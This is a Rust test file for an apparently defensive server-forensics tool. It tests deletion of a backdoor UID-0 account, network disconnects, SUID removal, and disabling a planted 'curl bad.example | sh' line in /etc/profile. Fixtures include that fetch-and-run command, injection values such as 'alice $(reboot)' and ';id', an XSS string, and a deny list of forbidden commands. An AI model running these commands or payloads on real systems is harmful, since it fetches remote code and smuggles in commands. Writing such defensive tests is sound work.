    fn a_second_uid_zero_account_is_deleted_with_only_the_busy_check_skipped() {
        let backdoor =
            parse_user_account_snapshot("sys-update\t0\t0\t/var/tmp\t/bin/sh\tP\troot").unwrap();
        let command = user_account_dispatch_command(&backdoor, UserAccountAction::Delete);
        assert!(command.contains("userdel -f \"$u\""), "{command}");
        // -f skips the process check; nothing that removes files comes with it.
        for forbidden in ["userdel -r", "-rf", "--remove-home", "rm -"] {
            assert!(!command.contains(forbidden), "{forbidden}: {command}");
        }
        // BusyBox deluser has no such check and is not forced.
        assert!(command.contains("deluser \"$u\"") && !command.contains("deluser -"));
        // root is confirmed UID 0 before userdel is reached.
        let guard = command.find("getent passwd root").unwrap();
        assert!(guard < command.find("userdel -f").unwrap());
        // An ordinary account is never forced.
        let alice = parse_user_account_snapshot(&user_snapshot(1000, "P")).unwrap();
        let ordinary = user_account_dispatch_command(&alice, UserAccountAction::Delete);
        assert!(!ordinary.contains("userdel -f"), "{ordinary}");
        // The plan says what -f does and does not do, and where the risk lies.
        let summary = user_account_delete_summary(&backdoor, Some("root"));
        assert!(
            summary.contains("UID 0") && summary.contains("userdel -f"),
            "{summary}"
        );
        assert!(!summary.contains("通常是系统或服务账户"), "{summary}");
    }

    #[test]
    fn account_delete_refuses_root_and_the_session_account_on_the_target() {
        let base = parse_user_account_snapshot(&user_snapshot(1000, "P")).unwrap();
        assert!(validate_user_account_precondition(&base, UserAccountAction::Delete).is_ok());
        let mut uid_zero = base.clone();
        uid_zero.uid = 0;
        assert!(validate_user_account_precondition(&uid_zero, UserAccountAction::Delete).is_ok());
        let root =
            parse_user_account_snapshot("root\t0\t0\t/root\t/bin/bash\tP\toperator").unwrap();
        assert!(validate_user_account_precondition(&root, UserAccountAction::Delete).is_err());
        // Logged in as the UID 0 account itself: refused, by login name.
        let own = parse_user_account_snapshot("sys-update\t0\t0\t/var/tmp\t/bin/sh\tP\tsys-update")
            .unwrap();
        assert!(validate_user_account_precondition(&own, UserAccountAction::Delete).is_err());
        // The session account is the name sshd logged in, not `id -un`, which
        // cannot tell two UID 0 accounts apart.
        let snapshot = user_account_snapshot_command("alice");
        assert!(
            snapshot.contains("current=${LOGNAME:-${USER:-}}"),
            "{snapshot}"
        );
        let mut session = base.clone();
        session.session_username = "alice".to_owned();
        assert!(validate_user_account_precondition(&session, UserAccountAction::Delete).is_err());
        // Locked or not makes no difference to whether an account may go.
        let locked = parse_user_account_snapshot(&user_snapshot(1000, "L")).unwrap();
        assert!(validate_user_account_precondition(&locked, UserAccountAction::Delete).is_ok());
    }

    #[test]
    fn account_delete_explains_why_an_account_is_still_there() {
        let planned = parse_user_account_snapshot(&user_snapshot(1000, "P")).unwrap();
        assert!(user_account_delete_detail(&planned, None, "x: accepted").contains("已不存在"));
        let busy = user_account_delete_detail(
            &planned,
            Some(&planned),
            "删除 alice: rejected-exit-Some(8)",
        );
        assert!(
            busy.contains("仍然存在，没有改动") && busy.contains("进程"),
            "{busy}"
        );
        assert!(
            user_account_delete_detail(&planned, Some(&planned), "x: rejected-exit-Some(77)")
                .contains("root")
        );
        assert!(
            user_account_delete_detail(&planned, Some(&planned), "x: rejected-exit-Some(78)")
                .contains("userdel")
        );
        let mut moved = planned.clone();
        moved.uid = 1001;
        assert!(user_account_delete_detail(&planned, Some(&moved), "x: accepted").contains("不同"));
        assert_eq!(
            parse_user_account_groups("alice sudo docker\n").as_deref(),
            Some("alice sudo docker")
        );
        assert_eq!(parse_user_account_groups("alice $(reboot)"), None);
        assert_eq!(parse_user_account_groups(""), None);
    }

    #[tokio::test]
    async fn account_delete_is_irreversible_journaled_and_verified_by_absence() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = user_table();
        let request = table
            .user_account_request(&table.rows[0].id, UserAccountAction::Delete)
            .unwrap();
        harness.set_execute_outputs([
            user_snapshot(1000, "P"),
            "alice sudo".to_owned(),
            user_snapshot(1000, "P"),
            String::new(),
            "ABSENT".to_owned(),
        ]);
        let plan = services
            .system_info()
            .plan_user_account(&session, &request)
            .await
            .unwrap();
        // No restore path is promised, and the plan says so in words.
        assert!(plan.definition().restore_description.is_none());
        let summary = &plan.definition().summary;
        assert!(
            summary.contains("不可自动恢复") && summary.contains("主目录"),
            "{summary}"
        );
        assert!(summary.contains("所属组 alice sudo"), "{summary}");
        assert_eq!(
            plan.definition().metadata.get("action").map(String::as_str),
            Some("delete")
        );
        assert_eq!(
            plan.definition().metadata.get("home").map(String::as_str),
            Some("/home/alice")
        );
        assert_eq!(
            plan.definition().metadata.get("groups").map(String::as_str),
            Some("alice sudo")
        );
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_user_account(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(
            outcome.verification.passed,
            "{}",
            outcome.verification.detail
        );
        assert!(outcome.verification.detail.contains("已不存在"));
        assert!(!outcome.restored_after_failed_verification);
        let commands = harness.execute_commands();
        assert!(
            commands
                .iter()
                .any(|command| command.contains("userdel \"$u\""))
        );
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 2);
        assert!(
            entries
                .iter()
                .all(|entry| entry.source == "system-info-user")
        );
    }

    #[tokio::test]
    async fn account_delete_that_did_not_happen_says_nothing_changed() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = user_table();
        let request = table
            .user_account_request(&table.rows[0].id, UserAccountAction::Delete)
            .unwrap();
        // The account is still there after the command: one read-back, then
        // one check that it is exactly as confirmed. No polling — on an RPM
        // host each read costs ~11 s and twenty of them outrun the deadline.
        harness.set_execute_outputs([
            user_snapshot(1000, "P"),
            "alice".to_owned(),
            user_snapshot(1000, "P"),
            String::new(),
            user_snapshot(1000, "P"),
            user_snapshot(1000, "P"),
        ]);
        let plan = services
            .system_info()
            .plan_user_account(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_user_account(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(!outcome.verification.passed);
        assert!(
            outcome.verification.detail.contains("仍然存在，没有改动"),
            "{}",
            outcome.verification.detail
        );
        // "Restored" here means: verified to be exactly as before.
        assert!(outcome.restored_after_failed_verification);
        // Nothing was attempted after the one delete command, and the whole
        // run was plan (2) + precondition + delete + read-back + final check.
        let commands = harness.execute_commands();
        assert_eq!(commands.len(), 6, "{commands:#?}");
        assert_eq!(
            commands
                .iter()
                .filter(|command| command.contains("userdel"))
                .count(),
            1
        );
        assert!(
            !commands
                .iter()
                .any(|command| command.contains("passwd -l") || command.contains("passwd -u"))
        );
    }

    #[tokio::test]
    async fn account_delete_of_the_session_account_is_refused_before_anything_runs() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = user_table();
        let request = table
            .user_account_request(&table.rows[0].id, UserAccountAction::Delete)
            .unwrap();
        harness.set_execute_output("alice\t1000\t1000\t/home/alice\t/bin/bash\tP\talice");
        assert!(
            services
                .system_info()
                .plan_user_account(&session, &request)
                .await
                .is_err()
        );
        assert!(
            !harness
                .execute_commands()
                .iter()
                .any(|command| command.contains("userdel"))
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn a_uid_zero_backdoor_is_deleted_and_root_is_checked_afterwards() {
        for (root_uid, passes) in [("0", true), ("1000", false)] {
            let root = TestRoot::new();
            let (services, session, harness) = bound_services(&root).await;
            let table = parse_table(
                &SystemInfoRequest::new(SystemInfoTab::Users, 1).unwrap(),
                "sys-update\t0\t0\t/var/tmp\t/bin/sh",
            );
            let request = table
                .user_account_request(&table.rows[0].id, UserAccountAction::Delete)
                .unwrap();
            let snapshot = "sys-update\t0\t0\t/var/tmp\t/bin/sh\tP\troot";
            harness.set_execute_outputs([
                snapshot.to_owned(),
                "root".to_owned(),
                snapshot.to_owned(),
                String::new(),
                "ABSENT".to_owned(),
                root_uid.to_owned(),
                // Read only when root was lost: is the account still as confirmed?
                "ABSENT".to_owned(),
            ]);
            let plan = services
                .system_info()
                .plan_user_account(&session, &request)
                .await
                .unwrap();
            let confirmation = DangerousConfirmation::approve(plan.definition());
            let outcome = services
                .system_info()
                .execute_user_account(&session, plan, confirmation, services.operation_journal())
                .await
                .unwrap();
            assert_eq!(
                outcome.verification.passed, passes,
                "{}",
                outcome.verification.detail
            );
            if !passes {
                assert!(
                    outcome.verification.detail.contains("root 已不是 UID 0"),
                    "{}",
                    outcome.verification.detail
                );
            }
            let commands = harness.execute_commands();
            assert!(
                commands
                    .iter()
                    .any(|command| command.contains("userdel -f \"$u\""))
            );
            // root is read back after the account is gone…
            let deleted = commands
                .iter()
                .position(|command| command.contains("userdel -f \"$u\""))
                .unwrap();
            assert!(
                commands[deleted..]
                    .iter()
                    .any(|command| command == root_uid_command())
            );
            // …and a run that lost root is not called "restored".
            if !passes {
                assert!(!outcome.restored_after_failed_verification);
            }
        }
    }

    #[test]
    fn a_second_uid_zero_account_is_marked_high_risk_in_the_user_table() {
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Users, 10).unwrap(),
            "root\t0\t0\t/root\t/bin/bash\n\
             sys-update\t0\t0\t/var/tmp\t/bin/sh\n\
             sync\t4\t0\t/bin\t/bin/sync\n\
             alice\t1000\t1000\t/home/alice\t/bin/bash",
        );
        let risks = table
            .rows
            .iter()
            .map(|row| (row.cells[0].as_str(), row.risk))
            .collect::<Vec<_>>();
        assert_eq!(
            risks,
            [
                ("root", SystemInfoRisk::Normal),
                ("sys-update", SystemInfoRisk::High),
                // GID 0 alone is how several distributions ship sync/halt.
                ("sync", SystemInfoRisk::Normal),
                ("alice", SystemInfoRisk::Normal),
            ]
        );
        // The rule belongs to the user table: a 0 in another table's second
        // column means nothing of the kind.
        let cron = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Cron, 10).unwrap(),
            "alice\t0\t/usr/bin/backup\t/etc/crontab",
        );
        assert_eq!(cron.rows[0].risk, SystemInfoRisk::Normal);
    }

    fn network_table() -> SystemInfoTable {
        parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Network, 1).unwrap(),
            "tcp\t10.0.0.1:50000\t203.0.113.8:443\tESTAB\t123\tusers:((sshd,pid=123,fd=4))",
        )
    }

    fn network_snapshot(process: &str) -> String {
        format!("10.0.0.1:50000\t203.0.113.8:443\tESTAB\t{process}")
    }

    #[test]
    fn network_catalog_replaces_every_legacy_read_action_with_typed_endpoints() {
        assert_eq!(NetworkInvestigationGroup::ALL.len(), 6);
        assert_eq!(NetworkInvestigationAction::ALL.len(), 19);
        let table = network_table();
        let row_id = table.rows[0].id.clone();
        let identity = table.network_identity(&row_id).unwrap();
        assert_eq!(identity.transport, NetworkTransport::Tcp);
        assert_eq!(identity.local.as_ref().unwrap().port, Some(50_000));
        assert_eq!(
            identity.remote.as_ref().unwrap().address,
            "203.0.113.8".parse::<IpAddr>().unwrap()
        );
        assert_eq!(identity.remote.as_ref().unwrap().port, Some(443));

        for action in NetworkInvestigationAction::ALL {
            assert!(!action.label().is_empty());
            assert!(NetworkInvestigationGroup::ALL.contains(&action.group()));
            let request = table
                .network_investigation_request(&row_id, action)
                .unwrap();
            let command = request.command().unwrap();
            for forbidden in [
                "ss -K",
                "iptables -A",
                "iptables -D",
                "nft add",
                "curl http",
            ] {
                assert!(!command.contains(forbidden), "{action:?}: {command}");
            }
        }
        let disconnect = table.network_disconnect_request(&row_id).unwrap();
        let command = network_disconnect_command(disconnect.identity()).unwrap();
        assert!(command.contains("ss -K src"));
        assert!(command.contains("lip='10.0.0.1'"));
        assert!(command.contains("rip='203.0.113.8'"));
    }

    #[test]
    fn network_identity_handles_ipv6_open_ports_and_rejects_hostile_or_wildcard_peers() {
        let established = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Established, 1).unwrap(),
            "[2001:db8::1]:50000\t[2001:db8::2]:443\t443\t123\tsshd\troot",
        );
        let identity = established
            .network_identity(&established.rows[0].id)
            .unwrap();
        assert!(matches!(
            identity.remote.as_ref().unwrap().address,
            IpAddr::V6(_)
        ));
        assert_eq!(identity.remote.as_ref().unwrap().port, Some(443));

        let listening = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::OpenPorts, 1).unwrap(),
            "tcp\t::\t22\t123\tsshd\troot",
        );
        let identity = listening.network_identity(&listening.rows[0].id).unwrap();
        assert_eq!(identity.local.as_ref().unwrap().port, Some(22));
        assert!(
            listening
                .network_investigation_request(
                    &listening.rows[0].id,
                    NetworkInvestigationAction::PortProcess,
                )
                .is_ok()
        );
        assert!(
            listening
                .network_investigation_request(
                    &listening.rows[0].id,
                    NetworkInvestigationAction::Whois,
                )
                .is_err()
        );

        for remote in ["203.0.113.8;id:443", "--help:443"] {
            let forged = parse_table(
                &SystemInfoRequest::new(SystemInfoTab::Network, 1).unwrap(),
                &format!("tcp\t10.0.0.1:50000\t{remote}\tESTAB\t1\tsshd"),
            );
            assert!(forged.network_identity(&forged.rows[0].id).is_err());
        }

        let wildcard = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Network, 1).unwrap(),
            "udp\t0.0.0.0:68\t*:*\tUNCONN\t1\tdhclient",
        );
        let wildcard_identity = wildcard.network_identity(&wildcard.rows[0].id).unwrap();
        assert!(wildcard_identity.remote.is_none());
        assert!(
            wildcard
                .network_investigation_request(
                    &wildcard.rows[0].id,
                    NetworkInvestigationAction::Whois,
                )
                .is_err()
        );
    }

    #[test]
    fn network_snapshot_parser_is_strict_and_process_text_is_hashed() {
        let parsed =
            parse_network_snapshot(&network_snapshot("<script>remote()</script>")).unwrap();
        assert_eq!(parsed.local_display, "10.0.0.1:50000");
        assert_eq!(parsed.remote_display, "203.0.113.8:443");
        assert_eq!(parsed.process_sha256.len(), 64);
        assert!(!parsed.process_sha256.contains("script"));
        for invalid in [
            "10.0.0.1;id:1\t203.0.113.8:443\tESTAB\tsshd",
            "10.0.0.1:1\t203.0.113.8:443\tBAD\nSTATE\tsshd",
            "ABSENT",
        ] {
            assert!(parse_network_snapshot(invalid).is_err());
        }
    }

    #[tokio::test]
    async fn network_investigation_is_target_bound_plain_and_byte_bounded() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = network_table();
        let request = table
            .network_investigation_request(
                &table.rows[0].id,
                NetworkInvestigationAction::SecurityLogs,
            )
            .unwrap();
        harness.set_execute_output(format!(
            "<script>alert(1)</script>\n{}",
            "界".repeat(MAX_NETWORK_INVESTIGATION_CHARS)
        ));
        let result = services
            .system_info()
            .investigate_network(&session, &request)
            .await
            .unwrap();
        assert!(result.output.starts_with("<script>alert(1)</script>"));
        assert!(result.output.len() <= MAX_NETWORK_INVESTIGATION_CHARS);
        assert!(result.truncated);

        services.target().clear().unwrap();
        assert!(
            services
                .system_info()
                .investigate_network(&session, &request)
                .await
                .is_err()
        );
    }

    #[tokio::test]
    async fn network_disconnect_requires_exact_confirmation_and_unchanged_connection() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = network_table();
        let request = table.network_disconnect_request(&table.rows[0].id).unwrap();
        harness.set_execute_output(network_snapshot("sshd"));
        let wrong_plan = services
            .system_info()
            .plan_network_disconnect(&session, &request)
            .await
            .unwrap();
        let unrelated =
            OperationPlan::new(session.target().clone(), "unrelated", true, None).unwrap();
        assert!(
            services
                .system_info()
                .execute_network_disconnect(
                    &session,
                    wrong_plan,
                    DangerousConfirmation::approve(&unrelated),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        harness.set_execute_outputs([network_snapshot("sshd"), network_snapshot("reused")]);
        let stale = services
            .system_info()
            .plan_network_disconnect(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(stale.definition());
        assert!(
            services
                .system_info()
                .execute_network_disconnect(
                    &session,
                    stale,
                    confirmation,
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn exact_network_disconnect_is_journaled_and_readback_verified() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let table = network_table();
        let request = table.network_disconnect_request(&table.rows[0].id).unwrap();
        harness.set_execute_outputs([
            network_snapshot("sshd"),
            network_snapshot("sshd"),
            String::new(),
            "ABSENT".to_owned(),
        ]);
        let plan = services
            .system_info()
            .plan_network_disconnect(&session, &request)
            .await
            .unwrap();
        assert!(plan.definition().restore_description.is_none());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_network_disconnect(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verification.passed);
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 2);
        assert!(
            entries
                .iter()
                .all(|entry| entry.source == "system-info-network")
        );
    }

    #[test]
    fn artifact_mutations_are_closed_to_managed_rows_and_paths() {
        let cron = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Cron, 8).unwrap(),
            "root\t* * * * *\t/usr/bin/true\t/etc/cron.d/lovely-job\nroot\t0 0 * * *\t/usr/bin/true\t/etc/crontab",
        );
        assert!(
            cron.artifact_mutation_request(
                &cron.rows[0].id,
                ArtifactMutationAction::DeleteCronFile,
            )
            .is_ok()
        );
        assert!(
            cron.artifact_mutation_request(
                &cron.rows[1].id,
                ArtifactMutationAction::DeleteCronFile,
            )
            .is_err()
        );

        let shell = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::ShellConfigs, 8).unwrap(),
            "/etc/profile\troot\t1\t4\tcurl bad.example | sh\twarning\n/etc/profile\troot\t1\t5\t# already disabled\tnormal",
        );
        assert!(
            shell
                .artifact_mutation_request(
                    &shell.rows[0].id,
                    ArtifactMutationAction::CommentShellLine,
                )
                .is_ok()
        );
        assert!(
            shell
                .artifact_mutation_request(
                    &shell.rows[1].id,
                    ArtifactMutationAction::CommentShellLine,
                )
                .is_err()
        );

        let suid = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::SuidFiles, 8).unwrap(),
            "/usr/bin/passwd\t4755\troot\t1\tnow\thigh\n/tmp/forged\t4755\troot\t1\tnow\thigh\n/usr/bin/normal\t0755\troot\t1\tnow\tnormal",
        );
        for action in [
            ArtifactMutationAction::RemoveSuidBits,
            ArtifactMutationAction::QuarantineSuidFile,
        ] {
            assert!(
                suid.artifact_mutation_request(&suid.rows[0].id, action)
                    .is_ok()
            );
            assert!(
                suid.artifact_mutation_request(&suid.rows[1].id, action)
                    .is_err()
            );
            assert!(
                suid.artifact_mutation_request(&suid.rows[2].id, action)
                    .is_err()
            );
        }
        assert!(
            suid.artifact_mutation_request(
                &suid.rows[0].id,
                ArtifactMutationAction::DeleteCronFile,
            )
            .is_err()
        );

        let modules = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::KernelModules, 8).unwrap(),
            "nf_conntrack\t4096\t0\tnormal\n--help\t1\t0\thigh",
        );
        for action in [
            ArtifactMutationAction::AddManagedModuleBlacklist,
            ArtifactMutationAction::RemoveManagedModuleBlacklist,
        ] {
            let request = modules
                .artifact_mutation_request(&modules.rows[0].id, action)
                .unwrap();
            assert_eq!(
                request.path().as_str(),
                "/etc/modprobe.d/lovelyres-blacklist-nf_conntrack.conf"
            );
            assert!(
                modules
                    .artifact_mutation_request(&modules.rows[1].id, action)
                    .is_err()
            );
        }
    }

    #[test]
    fn shell_line_comment_preserves_bytes_and_rejects_stale_display_content() {
        let original = b"export SAFE=1\n\tcurl bad.example | sh\r\nlast=1\n";
        let replacement = comment_shell_line(original, 2, " curl bad.example | sh").unwrap();
        assert_eq!(
            replacement,
            b"export SAFE=1\n# LovelyHawk disabled: \tcurl bad.example | sh\r\nlast=1\n"
        );
        assert!(comment_shell_line(original, 2, "changed").is_err());
        assert!(comment_shell_line(original, 9, "missing").is_err());
        assert!(comment_shell_line(b"# disabled\n", 1, "# disabled").is_err());
    }

    #[tokio::test]
    async fn cron_and_shell_mutations_use_exact_sftp_content_cas_and_journal() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        harness.set_sftp_immediate(true);
        harness.set_sftp_file(
            "/etc/cron.d/lovely-job",
            b"* * * * * root /bin/true\n".to_vec(),
        );
        let cron = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Cron, 1).unwrap(),
            "root\t* * * * *\t/bin/true\t/etc/cron.d/lovely-job",
        );
        let request = cron
            .artifact_mutation_request(&cron.rows[0].id, ArtifactMutationAction::DeleteCronFile)
            .unwrap();
        let stale_plan = services
            .system_info()
            .plan_artifact_mutation(&session, &request)
            .await
            .unwrap();
        harness.set_sftp_file(
            "/etc/cron.d/lovely-job",
            b"* * * * * root /bin/changed\n".to_vec(),
        );
        let confirmation = DangerousConfirmation::approve(stale_plan.definition());
        assert!(
            services
                .system_info()
                .execute_artifact_mutation(
                    &session,
                    stale_plan,
                    confirmation,
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        harness.set_sftp_file("/etc/profile", b"safe=1\ncurl bad.example | sh\n".to_vec());
        let shell = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::ShellConfigs, 1).unwrap(),
            "/etc/profile\troot\t1\t2\tcurl bad.example | sh\twarning",
        );
        let request = shell
            .artifact_mutation_request(&shell.rows[0].id, ArtifactMutationAction::CommentShellLine)
            .unwrap();
        let plan = services
            .system_info()
            .plan_artifact_mutation(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_artifact_mutation(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verification.passed);
        let bound = services
            .sftp()
            .bind_session(session.target().clone(), session.session_id())
            .await
            .unwrap();
        assert_eq!(
            services
                .sftp()
                .read_file(&bound, &RemotePath::new("/etc/profile").unwrap())
                .await
                .unwrap(),
            b"safe=1\n# LovelyHawk disabled: curl bad.example | sh\n"
        );
        assert_eq!(services.operation_journal().entries().unwrap().len(), 2);
    }

    #[test]
    fn an_inventory_nobody_can_read_is_not_an_empty_inventory() {
        // Alpine has neither dpkg nor rpm, so every branch fell through, the
        // command exited zero saying nothing, and the tab reported that the
        // machine had no packages installed — to somebody looking for one that
        // should not be there.
        assert!(
            PACKAGES_COMMAND.contains("/lib/apk/db/installed"),
            "{PACKAGES_COMMAND}"
        );
        assert!(PACKAGES_COMMAND.contains("pacman -Q"), "{PACKAGES_COMMAND}");
        // And a machine with none of the four now says so rather than showing
        // an empty list, which is a different fact.
        assert_eq!(
            SystemInfoTab::Packages.required_tool(),
            Some("dpkg、rpm、apk 或 pacman")
        );
        let wrapped = SystemInfoTab::Packages.command(10);
        assert!(wrapped.contains(NO_TOOL_MARKER), "{wrapped}");
        // Every branch has to respect the row cap, or one package manager
        // would answer without a truncation notice.
        assert_eq!(PACKAGES_COMMAND.matches(ROW_LIMIT_MARKER).count(), 4);
        // Running processes before unreaped ones, stably, and only then cut to
        // 500: lab-ubuntu had 2,165 zombies, and PID order filled the table
        // with them while live processes fell off the end.
        let order = PROCESS_COMMAND.find("sort -s -n -k1,1").unwrap();
        assert!(PROCESS_COMMAND.find("($4 ~ /^Z/ ? 1 : 0)").unwrap() < order);
        assert!(order < PROCESS_COMMAND.find(ROW_LIMIT_MARKER).unwrap());
        assert_eq!(
            SystemInfoTab::Packages
                .command(10)
                .matches("head -n 11")
                .count(),
            4
        );
    }

    #[test]
    fn login_history_falls_back_to_the_spelling_busybox_understands() {
        // `last -Faiw` is the GNU spelling; busybox rejects the flag group and
        // exits 1 with nothing on stdout. The tab only checks that `last`
        // exists, so it showed an empty login history — on the tab an operator
        // opens to see who has been on the machine.
        assert!(LOGIN_HISTORY_COMMAND.contains("last -Faiw 2>/dev/null || last 2>/dev/null"));
        // busybox prints a header row, which would otherwise become a login by
        // a user called USER.
        assert!(LOGIN_HISTORY_COMMAND.contains("shutdown|USER"));
    }

    #[test]
    fn no_command_asks_a_machine_for_find_printf() {
        // busybox has no `find -printf`. The commands sent their errors to
        // /dev/null and ended in `head`, whose exit status is the pipeline's,
        // so an Alpine machine answered "command succeeded, no output" — and
        // the SUID, sensitive-file and recently-changed tables each told the
        // operator there was nothing to see. On a machine with a setuid
        // backdoor that is not a missing row; it is a false all-clear on the
        // table somebody opened to find exactly that.
        // Spelled in pieces so this test does not trip over its own source.
        let banned = concat!("-print", "f");
        let source = include_str!("system_info.rs");
        for (index, line) in source.lines().enumerate() {
            // Prose about the trap is allowed to name it; commands are not.
            let is_prose = line.trim_start().starts_with("//");
            let is_this_test =
                line.contains(concat!("\"-print", "\", \"f\"")) || line.contains("let banned =");
            assert!(
                is_prose || is_this_test || !line.contains(banned),
                "line {} asks a machine for something busybox does not have: {line}",
                index + 1
            );
        }

        // And the three tables read the facts the portable way.
        for command in [SUID_COMMAND, SENSITIVE_COMMAND, RECENT_FILES_COMMAND] {
            assert!(
                command.contains("-exec stat -c '%a|%U|%s|%y|%n' {} +"),
                "{command}"
            );
            // The path is printed last so a name containing the separator
            // still arrives whole, and awk puts it back together.
            assert!(
                command.contains(r#"for(i=6;i<=NF;i++) path=path "|" $i"#),
                "{command}"
            );
            // Round 11's truncation notice keys off this exact text.
            assert!(command.ends_with("| head -n 500"), "{command}");
        }
    }

    #[test]
    fn disarming_a_setuid_file_does_not_leave_a_setuid_copy_of_it() {
        let plan = SuidPermissionPlan {
            operation: OperationPlan::new(
                crate::target::TargetContext::new()
                    .activate(crate::target::TargetIdentity::new("host-a").unwrap())
                    .unwrap(),
                "移除 SUID/SGID 位".to_owned(),
                true,
                Some("恢复原来的权限位".to_owned()),
            )
            .unwrap(),
            snapshot: SuidFileSnapshot {
                path: RemotePath::new("/usr/local/bin/.probe-suid").unwrap(),
                sha256: "cd".repeat(32),
                mode: 0o4755,
                uid: 0,
                gid: 0,
                size: 1234,
                device: 8,
                inode: 99,
            },
            target_mode: 0o755,
            backup_directory: RemotePath::new("/usr/local/bin/.lovelyres-backups").unwrap(),
            backup_path: RemotePath::new("/usr/local/bin/.lovelyres-backups/c-.probe-suid")
                .unwrap(),
        };
        let command = suid_permission_apply_command(&plan);
        // `cp -a` carried the source's mode across, setuid bit and all: taking
        // the bits off one file while making a second file that still has them.
        assert!(
            !command.contains("cp -aL"),
            "the copy keeps the mode it is supposed to be removing: {command}"
        );
        assert!(command.contains("cp -L -- /proc/self/fd/9"), "{command}");
        assert_eq!(MANAGED_BACKUP_MODE, 0o600);
        assert!(command.contains("chmod '600' -- \"$b\""), "{command}");
        // The directory stays shut too.
        assert!(command.contains("install -d -m 700"), "{command}");
    }

    #[test]
    fn the_suid_snapshot_asks_for_something_a_real_machine_can_answer() {
        let path = RemotePath::new("/usr/bin/passwd").unwrap();
        let command = suid_snapshot_command(&path);
        // `stat -c` does not interpret backslash escapes — only `--printf`
        // does, and busybox has no `--printf` at all. Asking for `\t` got a
        // literal backslash back from every machine, one field instead of
        // seven, and an action that could never run.
        assert!(
            !command.contains("\\t"),
            "the format string asks for an escape stat -c will not expand: {command}"
        );

        // Copied off lab-ubuntu, byte for byte.
        let real = format!(
            "{} 4755 0 0 59976 110 116409\n",
            "82fb3e989f9f224f1b1b5687109fa4c31fc60572876cd7c3486ff107d451b6ee"
        );
        let snapshot = parse_suid_snapshot(&path, &real).expect("a real machine's answer");
        assert_eq!(snapshot.mode, 0o4755);
        assert_eq!(snapshot.uid, 0);
        assert_eq!(snapshot.size, 59976);
        assert_eq!(snapshot.inode, 116_409);

        // What the machine used to send back, which has to stay a refusal
        // rather than parse into something wrong.
        let escaped = format!("{}\\t4755\\t0\\t0\\t59976\\t110\\t116409\n", "8".repeat(64));
        assert!(parse_suid_snapshot(&path, &escaped).is_err());

        // A machine whose shell prints on startup. Copied off lab-suse, where
        // a line in a startup file produced two errors before the answer —
        // which is the ordinary state of a machine somebody has been living in.
        let noisy = format!(
            "/root/.bashrc: line 1: a: command not found\nnc: invalid option -- 'e'\n{real}"
        );
        let from_noise = parse_suid_snapshot(&path, &noisy).expect("the answer among the noise");
        assert_eq!(from_noise.mode, 0o4755);
        assert_eq!(from_noise.inode, 116_409);

        // Noise alone is still a refusal.
        assert!(parse_suid_snapshot(&path, "bash: something went wrong\n").is_err());
    }

    #[tokio::test]
    async fn suid_permission_operation_is_snapshot_bound_journaled_and_verified() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let sha = "ab".repeat(32);
        // Spaces, because that is what the machine sends. Writing `\t` here
        // put a real tab in the fixture and hid for a long time that the shell
        // command was asking for something `stat -c` never produces.
        let snapshot = format!("{sha} 4755 0 0 4096 8 99");
        let applied = format!("{sha} 755 0 0 4096 8 99");
        // The copy is pinned at 0600; it does not carry the setuid bit it was
        // made to take away.
        let backup = format!("{sha} 600 0 0 4096 9 100");
        harness.set_execute_outputs([
            snapshot.clone(),
            snapshot,
            "APPLIED".to_owned(),
            applied,
            backup,
        ]);
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::SuidFiles, 1).unwrap(),
            "/usr/bin/passwd\t4755\troot\t4096\tnow\thigh",
        );
        let request = table
            .artifact_mutation_request(&table.rows[0].id, ArtifactMutationAction::RemoveSuidBits)
            .unwrap();
        let plan = services
            .system_info()
            .plan_artifact_mutation(&session, &request)
            .await
            .unwrap();
        assert!(plan.definition().summary.contains("受管备份"));
        assert!(plan.definition().restore_description.is_some());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_artifact_mutation(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verification.passed);
        let entries = services.operation_journal().entries().unwrap();
